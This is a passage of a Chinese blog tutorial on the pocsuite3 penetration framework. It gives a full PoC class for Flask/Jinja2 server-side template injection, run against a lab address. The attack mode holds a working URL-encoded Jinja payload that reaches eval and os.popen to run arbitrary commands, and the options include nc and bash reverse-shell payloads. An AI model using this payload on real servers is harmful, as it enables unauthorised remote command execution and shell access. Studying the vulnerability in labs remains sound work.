+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">功能：使用pocsuite对flask模板注入进行检测和利用
+</span></span></span><span class="line"><span class="cl"><span class="s2">@author: 剑胆琴心
+</span></span></span><span class="line"><span class="cl"><span class="s2">@使用方法：
+</span></span></span><span class="line"><span class="cl"><span class="s2">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify
+</span></span></span><span class="line"><span class="cl"><span class="s2">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify  --command &#39;id&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">OrderedDict</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pocsuite3.api</span> <span class="kn">import</span> <span class="n">Output</span><span class="p">,</span> <span class="n">POCBase</span><span class="p">,</span> <span class="n">register_poc</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">logger</span><span class="p">,</span> <span class="n">VUL_TYPE</span><span class="p">,</span> <span class="n">POC_CATEGORY</span><span class="p">,</span> <span class="n">OptDict</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pocsuite3.api</span> <span class="kn">import</span> <span class="n">get_listener_ip</span><span class="p">,</span> <span class="n">get_listener_port</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pocsuite3.api</span> <span class="kn">import</span> <span class="n">REVERSE_PAYLOAD</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pocsuite3.lib.utils</span> <span class="kn">import</span> <span class="n">random_str</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FlaskPOCEXP</span><span class="p">(</span><span class="n">POCBase</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    0.编写的文件名应该符合poc命名规范：&#34;组成漏洞应用名_版本号_漏洞类型名称&#34;, 其中文件名中所有字母改为小写，所有特殊符号改为下划线
+</span></span></span><span class="line"><span class="cl"><span class="s1">    1.编写DemoPOC类，继承自POCBase类
+</span></span></span><span class="line"><span class="cl"><span class="s1">    2.填写POC信息字段（如下）：
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vulID</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="c1"># ssvid ID，如果是提交漏洞同时提交POC，写成0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">version</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span>   <span class="c1"># 默认为1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">author</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;剑胆琴心&#39;</span><span class="p">]</span>     <span class="c1"># POC作者的名字</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vulDate</span> <span class="o">=</span> <span class="s1">&#39;2021-01-11&#39;</span>  <span class="c1"># 漏洞公开的时间，不明确时可以写今天（我瞎写的时间）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">createDate</span> <span class="o">=</span> <span class="s1">&#39;2021-01-11&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">updateDate</span> <span class="o">=</span> <span class="s1">&#39;2021-01-11&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">references</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;http://www.xpshuai.cn&#39;</span><span class="p">]</span>  <span class="c1"># 漏洞地址来源，0day可以不写</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;Python Flask SSTI(服务端模板注入)漏洞&#39;</span>      <span class="c1"># POC名称</span>
+</span></span><span class="line"><span class="cl">    <span class="n">appPowerLink</span> <span class="o">=</span> <span class="s1">&#39;http://www.xpshuai.cn&#39;</span>   <span class="c1"># 漏洞厂商的主页地址</span>
+</span></span><span class="line"><span class="cl">    <span class="n">appName</span> <span class="o">=</span> <span class="s1">&#39;Flask&#39;</span>       <span class="c1"># 漏洞应用名称</span>
+</span></span><span class="line"><span class="cl">    <span class="n">appVersion</span> <span class="o">=</span> <span class="s1">&#39;All&#39;</span>      <span class="c1"># 漏洞影响版本</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># vulType = VUL_TYPE.OTHER      # 漏洞类型(这里我瞎选的)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">desc</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        SSTI(Server-Side Template Injection)服务端模板注入，
+</span></span></span><span class="line"><span class="cl"><span class="s1">        就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">samples</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&#39;</span><span class="p">]</span>  <span class="c1"># 漏洞样例，使用poc测试成功的网站</span>
+</span></span><span class="line"><span class="cl">    <span class="n">install_requies</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_options</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="c1"># 接收用户外部输出参数command</span>
+</span></span><span class="line"><span class="cl">        <span class="n">o</span> <span class="o">=</span> <span class="n">OrderedDict</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;nc&#34;</span><span class="p">:</span> <span class="n">REVERSE_PAYLOAD</span><span class="o">.</span><span class="n">NC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bash&#34;</span><span class="p">:</span> <span class="n">REVERSE_PAYLOAD</span><span class="o">.</span><span class="n">BASH</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">o</span><span class="p">[</span><span class="s2">&#34;command&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">OptDict</span><span class="p">(</span><span class="n">selected</span><span class="o">=</span><span class="s2">&#34;bash&#34;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">o</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_verify</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        验证模式
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 这里写验证代码...</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;/?name=&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">+</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;{{22*22}}&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 第一次请求</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resq</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">resq</span> <span class="ow">and</span> <span class="n">resq</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&#34;484&#34;</span> <span class="ow">in</span> <span class="n">resq</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>   <span class="c1"># 创建自定义的字典信息</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;URL&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;Payload&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_attack</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        攻击模式
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;/?name=&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">+</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_option</span><span class="p">(</span><span class="s2">&#34;command&#34;</span><span class="p">)</span>    <span class="c1"># 获取command参数</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%7B</span><span class="si">%25%</span><span class="s2">20for</span><span class="si">%20c%20i</span><span class="s2">n</span><span class="si">%20%</span><span class="s2">5B%5D.__class__.__base__.__subclasses__()</span><span class="si">%20%</span><span class="s2">25%7D%0A%7B</span><span class="si">%25%</span><span class="s2">20if</span><span class="si">%20c</span><span class="s2">.__name__</span><span class="si">%20%</span><span class="s2">3D%3D</span><span class="si">%20%</span><span class="s2">27catch_warnings</span><span class="si">%27%</span><span class="s2">20</span><span class="si">%25%</span><span class="s2">7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20for%20b</span><span class="si">%20i</span><span class="s2">n</span><span class="si">%20c</span><span class="s2">.__init__.__globals__.values()</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20if%20b.__class__</span><span class="si">%20%</span><span class="s2">3D%3D</span><span class="si">%20%</span><span class="s2">7B%7D.__class__</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20if</span><span class="si">%20%</span><span class="s2">27eval</span><span class="si">%27%</span><span class="s2">20in%20b.keys()</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%7B%7B%20b%5B</span><span class="si">%27e</span><span class="s2">val</span><span class="si">%27%</span><span class="s2">5D(%27__import__(</span><span class="si">%22o</span><span class="s2">s%22).popen(%22&#39; &#34;</span><span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s2">&#34;&#39;%22).read()%27)</span><span class="si">%20%</span><span class="s2">7D%7D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20endif</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20endif</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20endfor</span><span class="si">%20%</span><span class="s2">25%7D%0A%7B</span><span class="si">%25%</span><span class="s2">20endif</span><span class="si">%20%</span><span class="s2">25%7D%0A%7B</span><span class="si">%25%</span><span class="s2">20endfor</span><span class="si">%20%</span><span class="s2">25%7D&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resq</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">resq</span> <span class="ow">and</span> <span class="n">resq</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&#34;www&#34;</span> <span class="ow">in</span> <span class="n">resq</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;URL&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1"># 检测返回结果数据统一封装到这个方法里进行处理</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">parse_output</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">Output</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">fail</span><span class="p">(</span><span class="s1">&#39;target is not vulnerable&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">output</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 注册POC类，千万不要忘记哦~~~</span>
+</span></span><span class="line"><span class="cl"><span class="n">register_poc</span><span class="p">(</span><span class="n">FlaskPOCEXP</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify  --command <span class="s1">&#39;whoami&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/pocsuite_flask_cmd.png"
+    data-srcset="http://image.xpshuai.cn/pocsuite_flask_cmd.png, http://image.xpshuai.cn/pocsuite_flask_cmd.png 1.5x, http://image.xpshuai.cn/pocsuite_flask_cmd.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/pocsuite_flask_cmd.png"
+    title="http://image.xpshuai.cn/pocsuite_flask_cmd.png"/></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/pocsuite%e7%ae%80%e5%8d%95%e5%ad%a6%e4%b9%a0.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E5%BC%80%E6%BA%90%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/' class="post-tag">开源渗透框架</a><a href='/tags/pocsuite/' class="post-tag">pocsuite</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/web%E5%AE%89%E5%85%A8%E7%AE%80%E8%A6%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/" class="post-nav-item" rel="prev" title="Web安全简要思维导图"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Web安全简要思维导图</a>
+      <a href="/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/" class="post-nav-item" rel="next" title="Java学习之数组">Java学习之数组<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
